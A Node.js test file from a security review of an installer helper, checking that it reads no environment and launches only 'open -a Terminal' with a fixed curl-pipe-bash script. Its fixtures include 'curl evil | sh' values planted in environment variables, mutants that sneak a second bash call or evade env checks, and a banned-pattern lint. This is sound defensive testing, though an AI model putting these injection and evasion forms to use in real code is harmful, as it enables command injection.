'use strict';
// Security review L1: the installer's command and "Plexiform runs one process"
// were only regex checks, which `process['env']` or a second destructured
// execFile got past. These check behaviour: with a poisoned environment the
// script is a frozen snapshot, and launch() makes exactly one child_process
// call, `open -a Terminal <file>`. The checks are also run against the
// reviewer's two mutations to prove they catch them. Env reads are caught by a
// process.env tripwire; the source regexes are only a lint, since computed keys,
// descriptors, string eval and ESM reach env without ever spelling it.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const cp = require('node:child_process');
const { testTempDir } = require('./helpers/tmp');

const SRC = path.join(__dirname, '..', 'src', 'ghostty-dock-install.js');
const CMD = 'curl -fsSL https://raw.githubusercontent.com/andrewbakercloudscale/ghossty-dock/main/get.sh | bash';
const SNAPSHOT = (file, dir) => [
  '#!/bin/zsh',
  'setopt pipefail',
  `/bin/mkdir '${dir}/started' 2>/dev/null || exit 0`,
  `/bin/rm -f '${file}'`,
  `trap '/bin/rm -rf '\\''${dir}'\\''' EXIT`,
  "print -r -- 'Plexiform opened this window to install Ghostty Dock, a third-party app by Andrew Baker (not part of Plexiform).'",
  "print -r -- 'See https://github.com/andrewbakercloudscale/ghossty-dock'",
  "print -r -- 'On macOS 13 or 14, install jq first: brew install jq'",
  "print -r -- ''",
  "print -r -- 'This will run:'",
  `print -r -- '  ${CMD}'`,
  "print -r -- ''",
  "print -r -- 'Press Return or type y to install; anything else cancels.'",
  'IFS= read -r reply || exit 1',
  "[[ -z $reply || $reply == [yY] ]] || { print -r -- 'Cancelled: nothing was installed.'; exit 1; }",
  CMD,
  'result=$?',
  "print -r -- ''",
  'if [ $result -eq 0 ]; then print -r -- \'Done. You can close this window; Plexiform will notice Ghostty Dock by itself.\'; else print -r -- "The installer stopped with code $result."; fi',
  'exit $result',
  '',
].join('\n');

const POISON = { PLX_CMD: 'curl evil | sh', GHOSTTY_DOCK_INSTALL: 'curl evil | sh', INSTALL_COMMAND: 'curl evil | sh', HOME: '/evil', PATH: '/evil', SHELL: '/evil/sh', TMPDIR: '/evil' };
const SPAWNERS = ['execFile', 'spawn', 'exec', 'fork', 'execSync', 'execFileSync', 'spawnSync'];

const TIMERS = ['setTimeout', 'setInterval', 'setImmediate'];
const realTimers = Object.fromEntries(TIMERS.map((k) => [k, globalThis[k]]));
const ALLOWED_MODULES = ['node:child_process', 'node:fs', 'node:os', 'node:path'];
const LINT_BANNED = [/process\.env/, /\benv\b/, /process\s*\[/, /globalThis/, /\bReflect\b/, /\beval\s*\(/, /\bFunction\s*\(/,
  /\bmodule\s*\.\s*require\b/, /\bimport\b/, /\.\s*constructor\s*\(/, /\bisProxy\b/, /\breport\b|getReport/, /\bFinalizationRegistry\b/];
const counts = (names) => names.reduce((m, n) => ({ ...m, [n]: (m[n] || 0) + 1 }), {});
const grew = (before, after) => Object.keys(after).filter((k) => after[k] > (before[k] || 0));
const listeners = () => Object.fromEntries(process.eventNames().map((n) => [String(n), process.listenerCount(n)]));

// Out of scope: a module that detects it is under test (util.types.isProxy,
// NODE_TEST_CONTEXT, a stubbed execFile, --test in argv…) and only misbehaves
// outside it. No test can rule that out; review of src/ghostty-dock-install.js
// is the guard, and the lint below only raises the cost.

// Loads `srcFile` fresh with child_process stubbed and the env poisoned, then
// writes and "opens" a script in a temp folder. Returns what failed. `seen`
// receives the env keys read, for the tests only: problems never name keys.
async function check(srcFile, seen = {}) {
  const problems = [];
  const calls = [];
  const saved = Object.fromEntries(SPAWNERS.map((k) => [k, cp[k]]));
  const env = { ...process.env };
  const root = testTempDir('px-dock-snap-');
  for (const k of SPAWNERS) {
    cp[k] = (...args) => {
      calls.push([k, args[0], args[1]]);
      const cb = args.find((a) => typeof a === 'function');
      if (cb) realTimers.setImmediate(() => cb(null, '', ''));
      return { on() { return this; }, kill() {}, stdout: null, stderr: null };
    };
  }
  Object.assign(process.env, POISON);
  // Tripwire: the module needs no environment at all, so any read while it
  // loads, builds the script and launches fails, whatever syntax reached it
  // (computed keys, descriptors, Function/vm strings, ESM `import process`).
  // process.report reads the real environment natively, so it is stubbed too.
  // Work left behind to run after the tripwire is gone also fails: timers are
  // recorded and never scheduled (unref'd ones are invisible to
  // getActiveResourcesInfo), and pending resources and process listeners must
  // not grow.
  const real = process.env;
  const reads = [];
  const writes = [];
  let enumerated = 0;
  const reportDesc = Object.getOwnPropertyDescriptor(process, 'report');
  const scheduled = [];
  const pendingBefore = counts(process.getActiveResourcesInfo());
  const listenersBefore = listeners();
  const proxy = new Proxy(real, {
    get(t, k) { reads.push(String(k)); return Reflect.get(t, k); },
    has(t, k) { reads.push(String(k)); return Reflect.has(t, k); },
    ownKeys(t) { enumerated++; return Reflect.ownKeys(t); },
    getOwnPropertyDescriptor(t, k) { reads.push(String(k)); return Reflect.getOwnPropertyDescriptor(t, k); },
    // Writes are recorded and dropped, so the test's own environment is never changed.
    set(t, k) { writes.push(String(k)); return true; },
    defineProperty(t, k) { writes.push(String(k)); return true; },
    deleteProperty(t, k) { writes.push(String(k)); return true; },
  });
  process.env = proxy;
  const report = () => { reads.push('<process.report>'); return { environmentVariables: {}, header: {} }; };
  Object.defineProperty(process, 'report', { configurable: true, get() { reads.push('<process.report>'); return { getReport: report, writeReport: report }; } });
  const inert = { ref() { return this; }, unref() { return this; }, hasRef() { return false; }, refresh() { return this; }, [Symbol.toPrimitive]() { return 0; } };
  for (const k of TIMERS) globalThis[k] = () => { scheduled.push(k); return inert; };
  // Swapping in a whole new env object would otherwise be silently undone here.
  let replaced = false;
  const untrip = () => {
    if (process.env !== proxy && process.env !== real) replaced = true;
    process.env = real;
    Object.defineProperty(process, 'report', reportDesc);
    Object.assign(globalThis, realTimers);
  };
  try {
    delete require.cache[require.resolve(srcFile)];
    const I = require(srcFile);
    if (I.INSTALL_COMMAND !== CMD) problems.push('INSTALL_COMMAND changed');
    const file = '/T/plexiform-terminal-X/continue.command';
    if (I.scriptBody(file, path.dirname(file)) !== SNAPSHOT(file, path.dirname(file))) problems.push('scriptBody differs from the snapshot');
    let opened = null;
    const r = await I.launch({ tempDir: root });
    const pending = grew(pendingBefore, counts(process.getActiveResourcesInfo()));
    const listening = grew(listenersBefore, listeners());
    untrip();
    seen.reads = reads;
    seen.writes = writes;
    if (reads.length || enumerated) problems.push(`read the environment: ${reads.length} key read(s), enumerated ${enumerated} time(s)`);
    if (replaced) problems.push('replaced the environment object');
    if (writes.length) problems.push(`wrote the environment: ${writes.length} key write(s)`);
    if (scheduled.length) problems.push(`scheduled ${scheduled.length} timer(s) to run later: ${[...new Set(scheduled)].join(', ')}`);
    if (pending.length) problems.push(`left work pending after launch: ${pending.join(', ')}`);
    if (listening.length) problems.push(`added process listeners: ${listening.join(', ')}`);
    if (!r.ok) problems.push(`launch failed: ${r.error}`);
    if (calls.length !== 1) problems.push(`expected one child_process call, got ${JSON.stringify(calls)}`);
    else {
      const [kind, bin, args] = calls[0];
      if (kind !== 'execFile' || bin !== '/usr/bin/open' || !Array.isArray(args) || args.length !== 3 || args[0] !== '-a' || args[1] !== 'Terminal') problems.push(`unexpected call ${JSON.stringify(calls[0])}`);
      else opened = args[2];
    }
    if (opened) {
      const body = fs.readFileSync(opened, 'utf8');
      if (body !== SNAPSHOT(opened, path.dirname(opened))) problems.push('the written script differs from the snapshot');
      if (body.split('\n').filter((l) => l === CMD).length !== 1) problems.push('the command line is not there exactly once');
    }
    // Lint, not proof: modules are an allow-list reached by literal require().
    const src = fs.readFileSync(srcFile, 'utf8');
    const imports = src.match(/require\(\s*['"`](?:node:)?child_process['"`]\s*\)/g) || [];
    if (imports.length !== 1 || !src.includes("const { execFile } = require('node:child_process');")) problems.push('child_process import is not exactly { execFile }');
    const literal = [...src.matchAll(/\brequire\('([a-z:_]+)'\)/g)].map((m) => m[1]);
    const anyRequire = (src.match(/\brequire\b/g) || []).length;
    if (anyRequire !== literal.length || literal.length !== ALLOWED_MODULES.length || [...literal].sort().join() !== ALLOWED_MODULES.join()) problems.push(`modules are not exactly ${ALLOWED_MODULES.join(', ')} by literal require`);
    for (const banned of LINT_BANNED) if (banned.test(src)) problems.push(`source uses ${banned}`);
  } finally {
    untrip();
    Object.assign(cp, saved);
    for (const k of Object.keys(process.env)) if (!(k in env)) delete process.env[k];
    Object.assign(process.env, env);
    delete require.cache[require.resolve(srcFile)];
    fs.rmSync(root, { recursive: true, force: true });
  }
  return problems;
}

function mutant(name, edit) {
  const dir = testTempDir(`px-dock-mut-${name}-`);
  const file = path.join(dir, 'ghostty-dock-install.js');
  const src = fs.readFileSync(SRC, 'utf8');
  const out = edit(src);
  assert.notEqual(out, src, `mutation ${name} applied`);
  fs.writeFileSync(file, out);
  return { file, dir };
}

test('with a poisoned env, the script is the frozen snapshot and launch makes exactly one call: open -a Terminal <file>', async () => {
  assert.deepEqual(await check(SRC), []);
});

test('the checks catch the reviewer\'s mutations', async () => {
  const env = mutant('env', (s) => s.replace('    INSTALL_COMMAND,\n', "    process['env'].PLX_CMD || INSTALL_COMMAND,\n"));
  const run2 = mutant('run2', (s) => s
    .replace("const { execFile } = require('node:child_process');", "const { execFile, execFile: run2 } = require('node:child_process');")
    .replace('  const s = writeScript({ tempDir, f });\n', "  const s = writeScript({ tempDir, f });\n  run2('/bin/bash', ['-c', INSTALL_COMMAND], () => {});\n"));
  try {
    const a = await check(env.file);
    assert.ok(a.some((p) => /snapshot/.test(p)) && a.includes(`source uses ${/process\s*\[/}`), JSON.stringify(a));
    const b = await check(run2.file);
    assert.ok(b.some((p) => /one child_process call/.test(p)) && b.some((p) => /exactly \{ execFile \}/.test(p)), JSON.stringify(b));
  } finally { for (const m of [env, run2]) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

// Reads that dodge `process.env` / `process[`: destructuring, and the process module itself.
test('the source check also catches env reads that avoid process.env', async () => {
  const forms = {
    destructure: "(() => { const { env: e } = process; return e.PLX_CMD; })() || INSTALL_COMMAND",
    module: "require('node:process').env.PLX_CMD || INSTALL_COMMAND",
  };
  const ms = Object.entries(forms).map(([name, expr]) => mutant(name, (s) => s.replace('    INSTALL_COMMAND,\n', `    ${expr},\n`)));
  try {
    for (const m of ms) {
      const p = await check(m.file);
      assert.ok(p.some((x) => /^source uses .*env/.test(x)), `${m.file}: ${JSON.stringify(p)}`);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

const BEHAVIOUR = /^(read the environment|scheduled \d+ timer|left work pending|added process listeners)/;
// PLX_INSTALL_X is not in POISON and is unset during check(), so the snapshot
// cannot fail on these: only the tripwire can catch them.
const X = 'PLX_INSTALL_X';
const E = `process['e' + 'nv'].${X}`;
const TRIP_FORMS = {
  computedDestructure: `(() => { const { ['e' + 'nv']: e } = process; return e.${X}; })()`,
  requireBracket: `require('node:process')['e' + 'nv'].${X}`,
  descriptor: `Object.getOwnPropertyDescriptor(process, 'e' + 'nv').value.${X}`,
  functionCtor: `(() => {}).constructor('return proc' + 'ess.e' + 'nv')().${X}`,
  report: `process.report.getReport().environmentVariables.${X}`,
};
// Reads that would land after launch() returns and the tripwire is gone.
const LATE_FORMS = {
  lateTimeout: { expr: `void setTimeout(() => ${E}, 20)`, want: /^scheduled \d+ timer\(s\) to run later: setTimeout$/ },
  lateUnrefTimeout: { expr: `void setTimeout(() => ${E}, 20).unref()`, want: /^scheduled \d+ timer\(s\) to run later: setTimeout$/ },
  doubleImmediate: { expr: `void setImmediate(() => setImmediate(() => ${E}))`, want: /^scheduled \d+ timer\(s\) to run later: setImmediate$/ },
  beforeExit: { expr: `void process.once('beforeExit', () => ${E})`, want: /^added process listeners: beforeExit$/ },
};
const at = (expr) => (s) => s.replace('    INSTALL_COMMAND,\n', `    (${expr}) || INSTALL_COMMAND,\n`);

// A file in ESM syntax that require() loads (Node 22). The comment spoofs the
// lint's exact-import check; child_process is reached through the default
// export at call time, so the stubs apply and nothing real is spawned.
function esmMutant() {
  const dir = testTempDir('px-dock-mut-esm-');
  const file = path.join(dir, 'ghostty-dock-install.mjs');
  const src = fs.readFileSync(SRC, 'utf8');
  const out = src
    .replace("'use strict';\n", '')
    .replace(
      "const fs = require('node:fs');\nconst os = require('node:os');\nconst path = require('node:path');\nconst { execFile } = require('node:child_process');\n",
      "import fs from 'node:fs';\nimport os from 'node:os';\nimport path from 'node:path';\nimport cp from 'node:child_process';\nimport process from 'node:process';\n// const { execFile } = require('node:child_process');\nconst execFile = (...a) => cp.execFile(...a);\n",
    )
    .replace('    INSTALL_COMMAND,\n', `    ((() => { const { ['e' + 'nv']: e } = process; return e.${X}; })()) || INSTALL_COMMAND,\n`)
    .replace(/^module\.exports = \{ (.*) \};$/m, 'export { $1 };');
  assert.notEqual(out, src);
  assert.ok(!/\brequire\(|module\.exports/.test(out.replace(/^\/\/.*$/gm, '')), 'ESM mutant is pure ESM');
  fs.writeFileSync(file, out);
  return { file, dir };
}

test('tripwire: the real module reads no env, schedules nothing and adds no listeners', async () => {
  for (let i = 0; i < 3; i++) {
    const seen = {};
    assert.deepEqual(await check(SRC, seen), []);
    assert.deepEqual(seen.reads, []);
    assert.deepEqual(seen.writes, []);
  }
});

test('tripwire: env reads the regex cannot see are caught by behaviour', async () => {
  delete process.env[X];
  const ms = Object.entries(TRIP_FORMS).map(([name, expr]) => ({ name, ...mutant(name, at(expr)) }));
  ms.push({ name: 'esmImportProcess', ...esmMutant() });
  try {
    for (const m of ms) {
      const seen = {};
      const p = await check(m.file, seen);
      const want = m.name === 'report' ? '<process.report>' : X;
      assert.ok(seen.reads.includes(want) && p.some((x) => /^read the environment: \d+ key read\(s\), enumerated \d+ time\(s\)$/.test(x)), `${m.name}: ${JSON.stringify(p)}`);
      assert.ok(!p.some((x) => /snapshot/.test(x)), `${m.name} should only be caught by the tripwire: ${JSON.stringify(p)}`);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

// Changing env (which the real terminal would inherit) without reading it:
// delete and a full-descriptor define fire neither get nor
// getOwnPropertyDescriptor, so only the write traps see them.
const WRITE_FORMS = {
  set: `void (process['e' + 'nv'].${X} = 'curl evil | sh')`,
  delete: `void delete process['e' + 'nv'].${X}`,
  define: `void Object.defineProperty(process['e' + 'nv'], '${X}', { value: 'curl evil | sh', writable: true, enumerable: true, configurable: true })`,
};

test('tripwire: replacing the whole env object is caught, not silently undone', async () => {
  delete process.env[X];
  const m = mutant('w-replace', at(`void Object.assign(process, { ['e' + 'nv']: { ${X}: 'curl evil | sh' } })`));
  try {
    const seen = {};
    const p = await check(m.file, seen);
    assert.ok(p.includes('replaced the environment object'), JSON.stringify(p));
    assert.ok(!p.some((x) => /snapshot|read the environment|wrote the environment/.test(x)), JSON.stringify(p));
    assert.equal(process.env[X], undefined);
  } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
});

test('tripwire: env writes are caught, by count, and never applied', async () => {
  delete process.env[X];
  const ms = Object.entries(WRITE_FORMS).map(([name, expr]) => ({ name, ...mutant(`w-${name}`, at(expr)) }));
  try {
    for (const m of ms) {
      const seen = {};
      const p = await check(m.file, seen);
      assert.ok(seen.writes.includes(X) && p.includes(`wrote the environment: ${seen.writes.length} key write(s)`), `${m.name}: ${JSON.stringify(p)}`);
      assert.ok(!p.some((x) => /snapshot|read the environment|\bPLX_INSTALL_X\b/.test(x)), `${m.name} is caught as a write only: ${JSON.stringify(p)}`);
      assert.equal(process.env[X], undefined);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

test('tripwire: work left to read env after launch returns is caught', async () => {
  delete process.env[X];
  const ms = Object.entries(LATE_FORMS).map(([name, f]) => ({ name, want: f.want, ...mutant(name, at(f.expr)) }));
  try {
    for (const m of ms) {
      const p = await check(m.file);
      assert.ok(p.some((x) => m.want.test(x)), `${m.name}: ${JSON.stringify(p)}`);
      assert.ok(!p.some((x) => /snapshot|read the environment/.test(x)), `${m.name} is caught for what it left behind: ${JSON.stringify(p)}`);
    }
  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
});

test('problems give counts, never env key names', async () => {
  const m = mutant('enumerate', at(`Object.keys(process['e' + 'nv']).length && ''`));
  try {
    const p = await check(m.file);
    const hit = p.find((x) => x.startsWith('read the environment: '));
    assert.match(hit, /^read the environment: \d+ key read\(s\), enumerated [1-9]\d* time\(s\)$/);
    const text = p.join('\n');
    const named = [...Object.keys(process.env), ...Object.keys(POISON)].filter((k) => k.length >= 3 && new RegExp(`\\b${k.replace(/[^\w]/g, '\\$&')}\\b`).test(text));
    assert.deepEqual(named, [], 'no env key name appears in the problems');
  } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
});

test('lint: modules are an allow-list by literal require; escape hatches are banned', async () => {
  const cases = {
    extraModule: [(s) => s.replace("const os = require('node:os');", "const os = require('node:os');\nconst vm = require('node:vm');"), /^modules are not exactly/],
    computedRequire: [(s) => s.replace("require('node:os')", "require('node:' + 'os')"), /^modules are not exactly/],
    moduleRequire: [(s) => s.replace("require('node:os')", "module.require('node:os')"), /module\\s\*\\.\\s\*require/],
    dynamicImport: [(s) => s.replace("const REPO_URL", "void import('node:os');\nconst REPO_URL"), /bimport/],
    ctor: [at("(() => {}).constructor('return 1')() && ''"), /constructor/],
    isProxy: [at("require('node:util').types.isProxy({}) && ''"), /isProxy/],
    report: [at(TRIP_FORMS.report), /report/],
  };
  for (const [name, [edit, want]] of Object.entries(cases)) {
    const m = mutant(`lint-${name}`, edit);
    try {
      const p = await check(m.file);
      assert.ok(p.some((x) => want.test(x)), `${name}: ${JSON.stringify(p)}`);
    } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
  }
});
